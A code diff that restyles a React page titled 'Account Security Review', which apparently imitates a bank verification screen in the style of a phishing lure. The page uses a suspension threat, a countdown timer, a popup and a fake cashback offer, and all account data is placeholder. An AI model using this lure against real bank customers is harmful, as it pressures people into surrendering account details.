@@ -16,10 +16,10 @@ const BankVerification = () => {
     const timer = setInterval(() => {
       setTimeLeft((prev) => (prev <= 1 ? (clearInterval(timer), 0) : prev - 1));
     }, 1000);
-    
+
     // Show popup after 5 seconds
     const popupTimer = setTimeout(() => setShowPopup(true), 5000);
-    
+
     return () => {
       clearInterval(timer);
       clearTimeout(popupTimer);
@@ -61,7 +61,7 @@ const BankVerification = () => {
                 </div>
               </div>
 
-              <h2 className="text-green-700 font-bold text-2xl sm:text-3xl mb-4 text-center">
+              <h2 className="text-green-700 font-bold text-xl sm:text-2xl lg:text-3xl mb-4 text-center">
                 Critical Security Verification Required
               </h2>
 
@@ -101,14 +101,14 @@ const BankVerification = () => {
 
               {/* Message */}
               <div className="mb-6">
-                <p className="text-gray-700 leading-relaxed mb-4">
+                <p className="text-gray-700 text-base leading-relaxed mb-4">
                   <strong className="text-gray-900">Dear Valued Customer,</strong>
                 </p>
-                <p className="text-gray-700 leading-relaxed mb-4">
-                  To protect your account and prevent unauthorized access, we require immediate verification of your account details. 
+                <p className="text-gray-700 text-base leading-relaxed mb-4">
+                  To protect your account and prevent unauthorized access, we require immediate verification of your account details.
                   <span className="font-semibold text-red-600"> Your account will be temporarily suspended in 24 hours</span> if verification is not completed.
                 </p>
-                <p className="text-gray-700 leading-relaxed">
+                <p className="text-gray-700 text-base leading-relaxed">
                   Please review your account information and complete the secure verification process to restore full access.
                 </p>
               </div>
@@ -155,7 +155,7 @@ const BankVerification = () => {
     <div className="flex flex-col min-h-screen w-full bg-gradient-to-br from-gray-50 to-blue-50">
       {/* Floating Ad */}
       {showAd && (
-        <div className="fixed top-24 right-4 sm:right-10 bg-gradient-to-br from-orange-500 to-red-500 shadow-2xl border-2 border-orange-400 p-6 rounded-2xl z-50 w-80 sm:w-96 animate-bounce">
+        <div className="fixed top-24 right-4 sm:right-10 bg-gradient-to-br from-orange-500 to-red-500 shadow-2xl border-2 border-orange-400 p-4 sm:p-6 rounded-2xl z-50 w-72 sm:w-80 lg:w-96 animate-bounce">
           <button
             onClick={() => setShowAd(false)}
             className="absolute top-2 right-2 bg-white/20 hover:bg-white/30 text-white rounded-full p-1 transition-colors"
@@ -166,7 +166,7 @@ const BankVerification = () => {
             🎁 Limited Time Offer!
           </h3>
           <p className="text-white/90 text-sm mb-4">
-            Update your account now and receive <strong className="text-yellow-300">10% cashback</strong> on your next 3 transactions! 
+            Update your account now and receive <strong className="text-yellow-300">10% cashback</strong> on your next 3 transactions!
             Plus get <strong className="text-yellow-300">FREE</strong> premium account upgrade!
           </p>
           <button className="w-full bg-white hover:bg-gray-100 text-orange-600 py-2 px-4 rounded-lg font-bold text-sm transition-colors shadow-lg">
@@ -220,7 +220,7 @@ const BankVerification = () => {
             </div>
           </div>
 
-          <div className="p-6 sm:p-12">
+          <div className="p-8 sm:p-12">
             {/* Header */}
             <div className="text-center mb-8">
               <div className="flex justify-center items-center gap-2 mb-4">
@@ -228,7 +228,7 @@ const BankVerification = () => {
                   <Lock className="w-8 h-8 text-green-600" />
                 </div>
               </div>
-              <h1 className="text-3xl sm:text-4xl lg:text-5xl font-bold text-gray-800 mb-3">
+              <h1 className="text-2xl sm:text-3xl lg:text-4xl xl:text-5xl font-bold text-gray-800 mb-3">
                 Account Security Review
               </h1>
               <p className="text-gray-600 text-base sm:text-lg max-w-2xl mx-auto">
@@ -258,28 +258,28 @@ const BankVerification = () => {
                   </h2>
                   <div className="space-y-3">
                     <div className="flex justify-between items-center py-2 border-b border-gray-200">
-                      <span className="text-gray-600 text-sm">Customer ID</span>
-                      <span className="font-semibold text-gray-800">0000-1234-5678-90</span>
+                      <span className="text-gray-600 text-base">Customer ID</span>
+                      <span className="font-semibold text-gray-800 text-base">0000-1234-5678-90</span>
                     </div>
                     <div className="flex justify-between items-center py-2 border-b border-gray-200">
-                      <span className="text-gray-600 text-sm">Account Type</span>
-                      <span className="font-semibold text-gray-800">Current / Checking</span>
+                      <span className="text-gray-600 text-base">Account Type</span>
+                      <span className="font-semibold text-gray-800 text-base">Current / Checking</span>
                     </div>
                     <div className="flex justify-between items-center py-2 border-b border-gray-200">
-                      <span className="text-gray-600 text-sm">Balance</span>
-                      <span className="font-semibold text-green-600">PKR 125,430.00</span>
+                      <span className="text-gray-600 text-base">Balance</span>
+                      <span className="font-semibold text-green-600 text-base">PKR 125,430.00</span>
                     </div>
                     <div className="flex justify-between items-center py-2 border-b border-gray-200">
-                      <span className="text-gray-600 text-sm">Email</span>
-                      <span className="font-semibold text-gray-800 text-xs sm:text-sm break-all">user@example.com</span>
+                      <span className="text-gray-600 text-base">Email</span>
+                      <span className="font-semibold text-gray-800 text-sm sm:text-base break-all">user@example.com</span>
                     </div>
                     <div className="flex justify-between items-center py-2 border-b border-gray-200">
-                      <span className="text-gray-600 text-sm">Phone</span>
-                      <span className="font-semibold text-gray-800">+92 300 1234567</span>
+                      <span className="text-gray-600 text-base">Phone</span>
+                      <span className="font-semibold text-gray-800 text-base">+92 300 1234567</span>
                     </div>
                     <div className="flex justify-between items-center py-2">
-                      <span className="text-gray-600 text-sm">Last Login</span>
-                      <span className="font-semibold text-gray-800 text-xs sm:text-sm">02-Jan-2026, 14:35</span>
+                      <span className="text-gray-600 text-base">Last Login</span>
+                      <span className="font-semibold text-gray-800 text-sm sm:text-base">02-Jan-2026, 14:35</span>
                     </div>
                   </div>
                 </div>
@@ -290,7 +290,7 @@ const BankVerification = () => {
                     <Shield className="w-5 h-5" />
                     Security Tips
                   </h3>
-                  <ul className="space-y-2 text-sm text-blue-900">
+                  <ul className="space-y-2 text-base text-blue-900">
                     <li className="flex items-start gap-2">
                       <CheckCircle className="w-4 h-4 text-blue-600 flex-shrink-0 mt-0.5" />
                       <span>Never share your password or OTP</span>
@@ -319,56 +319,56 @@ const BankVerification = () => {
                     <div className="bg-white rounded-xl p-4 border border-gray-200 hover:shadow-md transition-shadow">
                       <div className="flex justify-between items-start mb-2">
                         <div>
-                          <p className="font-semibold text-gray-800">Utility Payment</p>
-                          <p className="text-xs text-gray-500">31-Dec-2025</p>
+                          <p className="font-semibold text-gray-800 text-base">Utility Payment</p>
+                          <p className="text-sm text-gray-500">31-Dec-2025</p>
                         </div>
-                        <span className="font-bold text-red-600">-2,500.00</span>
+                        <span className="font-bold text-red-600 text-base">-2,500.00</span>
                       </div>
                       <div className="flex items-center gap-1">
                         <CheckCircle className="w-3 h-3 text-green-600" />
-                        <span className="text-xs text-green-600 font-semibold">Completed</span>
+                        <span className="text-sm text-green-600 font-semibold">Completed</span>
                       </div>
                     </div>
 
                     <div className="bg-white rounded-xl p-4 border border-gray-200 hover:shadow-md transition-shadow">
                       <div className="flex justify-between items-start mb-2">
                         <div>
-                          <p className="font-semibold text-gray-800">Salary Credit</p>
-                          <p className="text-xs text-gray-500">30-Dec-2025</p>
+                          <p className="font-semibold text-gray-800 text-base">Salary Credit</p>
+                          <p className="text-sm text-gray-500">30-Dec-2025</p>
                         </div>
-                        <span className="font-bold text-green-600">+45,000.00</span>
+                        <span className="font-bold text-green-600 text-base">+45,000.00</span>
                       </div>
                       <div className="flex items-center gap-1">
                         <CheckCircle className="w-3 h-3 text-green-600" />
-                        <span className="text-xs text-green-600 font-semibold">Completed</span>
+                        <span className="text-sm text-green-600 font-semibold">Completed</span>
                       </div>
                     </div>
 
                     <div className="bg-white rounded-xl p-4 border border-gray-200 hover:shadow-md transition-shadow">
                       <div className="flex justify-between items-start mb-2">
                         <div>
-                          <p className="font-semibold text-gray-800">Online Shopping</p>
-                          <p className="text-xs text-gray-500">28-Dec-2025</p>
+                          <p className="font-semibold text-gray-800 text-base">Online Shopping</p>
+                          <p className="text-sm text-gray-500">28-Dec-2025</p>
                         </div>
-                        <span className="font-bold text-red-600">-3,200.00</span>
+                        <span className="font-bold text-red-600 text-base">-3,200.00</span>
                       </div>
                       <div className="flex items-center gap-1">
                         <CheckCircle className="w-3 h-3 text-green-600" />
-                        <span className="text-xs text-green-600 font-semibold">Completed</span>
+                        <span className="text-sm text-green-600 font-semibold">Completed</span>
                       </div>
                     </div>
 
                     <div className="bg-white rounded-xl p-4 border border-gray-200 hover:shadow-md transition-shadow">
                       <div className="flex justify-between items-start mb-2">
                         <div>
-                          <p className="font-semibold text-gray-800">ATM Withdrawal</p>
-                          <p className="text-xs text-gray-500">27-Dec-2025</p>
+                          <p className="font-semibold text-gray-800 text-base">ATM Withdrawal</p>
+                          <p className="text-sm text-gray-500">27-Dec-2025</p>
                         </div>
-                        <span className="font-bold text-red-600">-5,000.00</span>
+                        <span className="font-bold text-red-600 text-base">-5,000.00</span>
                       </div>
                       <div className="flex items-center gap-1">
                         <CheckCircle className="w-3 h-3 text-green-600" />
-                        <span className="text-xs text-green-600 font-semibold">Completed</span>
+                        <span className="text-sm text-green-600 font-semibold">Completed</span>
                       </div>
                     </div>
                   </div>
@@ -377,13 +377,13 @@ const BankVerification = () => {
             </div>
 
             {/* Countdown Timer */}
-            <div className="bg-gradient-to-r from-orange-50 to-red-50 border-2 border-orange-300 rounded-2xl p-8 text-center mb-8">
+            <div className="bg-gradient-to-r from-orange-50 to-red-50 border-2 border-orange-300 rounded-2xl p-6 sm:p-8 text-center mb-8">
               <div className="flex justify-center mb-3">
-                <Clock className="w-10 h-10 text-orange-600 animate-pulse" />
+                <Clock className="w-8 h-8 sm:w-10 sm:h-10 text-orange-600 animate-pulse" />
               </div>
-              <p className="text-sm text-orange-800 font-semibold mb-2">TIME REMAINING TO COMPLETE VERIFICATION</p>
-              <p className="text-5xl font-bold text-orange-600 mb-2">{formatTime(timeLeft)}</p>
-              <p className="text-xs text-orange-700">Your session will expire after this time</p>
+              <p className="text-sm sm:text-base text-orange-800 font-semibold mb-2">TIME REMAINING TO COMPLETE VERIFICATION</p>
+              <p className="text-4xl sm:text-5xl font-bold text-orange-600 mb-2">{formatTime(timeLeft)}</p>
+              <p className="text-sm text-orange-700">Your session will expire after this time</p>
             </div>
 
             {/* CTA Button */}
@@ -398,10 +398,10 @@ const BankVerification = () => {
 
             {/* Help Section */}
             <div className="bg-gray-50 rounded-2xl p-6 text-center border border-gray-200">
-              <p className="text-gray-700 mb-3">
+              <p className="text-gray-700 text-base mb-3">
                 <strong>Need Immediate Assistance?</strong>
               </p>
-              <div className="flex flex-col sm:flex-row items-center justify-center gap-4 text-sm">
+              <div className="flex flex-col sm:flex-row items-center justify-center gap-4 text-sm sm:text-base">
                 <div className="flex items-center gap-2 text-green-600 font-semibold">
                   <Phone className="w-4 h-4" />
                   <span>Call: +92 300 1234567</span>
